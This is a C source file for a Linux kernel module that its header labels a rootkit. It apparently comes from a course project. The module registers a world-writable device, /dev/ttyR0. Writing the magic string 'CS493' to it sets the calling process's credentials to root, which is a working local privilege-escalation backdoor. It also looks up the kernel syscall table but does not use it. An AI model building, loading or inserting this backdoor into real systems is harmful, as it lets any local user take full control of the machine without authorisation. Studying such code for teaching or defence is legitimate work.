// lkmr.c
// Alex Cater & Andrew Parker
// 2019-10-24
// Linux Kernel Module Rootkit

#include <linux/module.h>	/* Needed by all modules */
#include <linux/kallsyms.h> /* for kallsyms_lookup_name */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <stdio.h>
#include <linux/version.h>

// *********************************************************************
// module metadata and get rid of taint message
// *********************************************************************

MODULE_LICENSE("GPL");

#define DRIVER_AUTHOR "Alex&Andrew"
#define DRIVER_DESC   "rootkit"

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

// *********************************************************************
// prototypes
// *********************************************************************
static int 	__init init_main(void);
static void __exit cleanup(void);
static int setup_device(void);
static int     dev_open  (struct inode *inode, struct file *f);
static ssize_t dev_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
static int dev_release(struct inode *inodep, struct file *filep);

// *********************************************************************
// variables
// *********************************************************************
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

#define  DEVICE_NAME "ttyR0"
#define  CLASS_NAME  "ttyRK"

static unsigned long *sys_call_table;

static int            majorNumber;
static struct class*  rootcharClass		= NULL;
static struct device* rootcharDevice	= NULL;
static int    				numberOpens 		= 0;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
	.open = dev_open,
	.read = dev_read,
	.write = dev_write,
	.release = dev_release,
};

// *********************************************************************
// functions
// *********************************************************************

// changes permission of device to allow to rw
static int uevent(struct device *dev, struct kobj_uevent_env *env){
	add_uevent_var(env, "DEVMODE=%#o", 0666);
	return 0;
}

static int setup_device(void)
{
	// Create char device
	// major number specifies which driver handles which device file
	if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
		{
			printk(KERN_ALERT "failed to register a major number\n");
			return majorNumber;
		}
	 printk(KERN_INFO "major number %d\n", majorNumber);

	 // Register the device class
	 rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
	 if (IS_ERR(rootcharClass))
		 {
			 unregister_chrdev(majorNumber, DEVICE_NAME);
			 printk(KERN_ALERT "Failed to register device class\n");
			 return PTR_ERR(rootcharClass);
	 }

	 // change permissions of device
	 rootcharClass->dev_uevent = uevent;

	 printk(KERN_INFO "device class registered correctly\n");

	 // Register the device driver
	 rootcharDevice = device_create(rootcharClass, NULL,
					MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
	 if (IS_ERR(rootcharDevice))
		 {
			 class_destroy(rootcharClass);
			 unregister_chrdev(majorNumber, DEVICE_NAME);
			 printk(KERN_ALERT "Failed to create the device\n");
			 return PTR_ERR(rootcharDevice);
		 }

		return 0;
}

// called each time device is opened from userspace
static int dev_open (struct inode *inode, struct file *f)
{
	printk ("Device open\n");
	numberOpens++;
	printk(KERN_INFO "Device has been opened %d time(s)\n", numberOpens);
	return 0;
}

// called each time data is sent from the device to user space
static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
{
	printk ("Device read\n");
	static char   message[] = "Hello, this is a message from the kernel";
	static short  size_of_message = sizeof(message);
	int error_count = 0;
   // copy_to_user has the format ( * to, *from, size) and returns 0 on success
   error_count = copy_to_user(buf, message, size_of_message);

   if (error_count==0){
      printk(KERN_INFO "User read %d characters\n", size_of_message);
      return (size_of_message=0);
   }
   else {
      printk(KERN_INFO "EBBChar: Failed to send %d characters to the user\n", error_count);
      return -EFAULT;
   }
  return len;
}

// called each time data is sent from user space to the device

// when the device is created, this function and root_open and root_read
// are passed for the device to return
// this function will wait for a user to write the cred and if the cred matches the hardcoded once
// it will change the user's id to root
static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{
	printk ("Device write\n");
	char   magic[] = "CS493";
	struct cred *new_cred;
	if (memcmp(buf, magic, (int)sizeof(magic)-1) == 0) 	// compares data and magic
	{
		// changes old creds to root
		if ((new_cred = prepare_creds ()) == NULL)					// gets current creds
		{
			printk ("Cannot prepare credentials\n");
			return 0;
		}
		printk ("You got root\n");
		V(new_cred->uid) = V(new_cred->gid) =  0;					// changes creds. uid -> 0
		V(new_cred->euid) = V(new_cred->egid) = 0;
		V(new_cred->suid) = V(new_cred->sgid) = 0;
		V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
		commit_creds (new_cred);													// saves creds
	}
	return len;
}

// Called when the device is closed in user space.
static int dev_release(struct inode *inodep, struct file *filep)
{
	printk ("Device release\n");
	return 0;
 }

// *********************************************************************
//  init and exit
// *********************************************************************

// ***** module init *****
static int __init init_main(void)
{
	printk(KERN_INFO "Module loaded!\n");
  sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

  if (sys_call_table == NULL) {
    printk(KERN_ERR "Couldn't look up sys_call_table\n");
    return -1;
  }
	printk(KERN_ERR "Found sys_call_table at %p\n", sys_call_table);

  return setup_device();
}

// ***** module exit *****
static void __exit cleanup(void)
{
	// Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);
  class_destroy(rootcharClass);
  unregister_chrdev(majorNumber, DEVICE_NAME);

	printk(KERN_INFO "Goodbye.\n");
}

module_init(init_main);
module_exit(cleanup);
